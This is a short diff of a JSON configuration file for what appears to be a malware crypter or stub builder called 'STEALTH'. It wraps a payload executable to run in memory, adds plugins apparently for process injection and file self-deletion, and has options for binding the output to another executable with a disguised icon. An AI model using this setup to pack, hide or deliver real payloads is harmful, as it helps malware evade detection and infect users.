@@ -1,18 +1,23 @@
 {
   "payload": "C:/Users/atomi/Downloads/STEALTH/tests/message_c.exe",
-  "output": "C:/Users/atomi/Downloads/STEALTH/bin/output/out_stub.exe",
+  "output": "C:/Users/atomi/Downloads/STEALTH/bin/output/output.exe",
   "junk": 0,
   "in_memory": true,
   "plugins": [
     {
-      "path": "C:\\Users\\atomi\\Downloads\\STEALTH\\bin\\plugins\\popup_test.dll",
+      "path": "C:/Users/atomi/Downloads/STEALTH/bin/plugins/protection_file_delete.dll",
       "stage": 0,
+      "order": 1
+    },
+    {
+      "path": "C:/Users/atomi/Downloads/STEALTH/bin/plugins/injector_timerqueue_real.dll",
+      "stage": 1,
       "order": 0
     }
   ],
   "binder_exe2": "",
-  "binder_output": "C:\\Users\\atomi\\Downloads\\STEALTH\\bin\\out_binder.exe",
-  "binder_icon": "C:/Users/atomi/Downloads/STEALTH/gui/icon/icon.ico",
+  "binder_output": "C:\\Users\\atomi\\Downloads\\STEALTH\\bin\\output\\out_binder.exe",
+  "binder_icon": "",
   "binder_enabled": false,
   "plugins_dir": "C:\\Users\\atomi\\Downloads\\STEALTH\\bin\\plugins"
 }
